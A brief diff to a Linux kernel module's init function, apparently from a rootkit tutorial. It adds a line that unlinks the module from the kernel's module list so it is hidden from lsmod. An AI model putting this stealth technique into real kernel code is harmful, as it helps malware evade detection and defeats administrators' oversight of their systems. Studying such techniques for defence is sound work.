@@ -6,6 +6,7 @@
  
 static int lkm_init(void)
 {
+    list_del_init(&__this_module.list);
     printk("Arciryas:module loaded\n");
     return 0;    
 }
